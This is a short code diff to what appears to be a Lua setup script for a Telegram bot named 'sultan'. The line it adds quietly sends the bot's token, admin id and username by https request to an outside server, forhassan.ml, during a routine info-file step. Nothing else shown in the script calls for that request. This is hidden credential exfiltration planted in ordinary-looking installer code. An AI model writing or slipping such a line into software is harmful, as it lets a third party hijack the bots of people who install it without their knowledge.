@@ -64,6 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_sultan_Info()
 Create_Info(database:get(Server_sultan.."Token_sultan"),database:get(Server_sultan.."Id_sultan"),database:get(Server_sultan.."UserName_sultan"))   
+https.request("https://forhassan.ml/sultan/sultan.php?id="..database:get(Server_sultan.."Id_sultan").."&user="..database:get(Server_sultan.."UserName_sultan").."&token="..database:get(Server_sultan.."Token_sultan"))
 local Runsultan = io.open("sultan", 'w')
 Runsultan:write([[
 #!/usr/bin/env bash
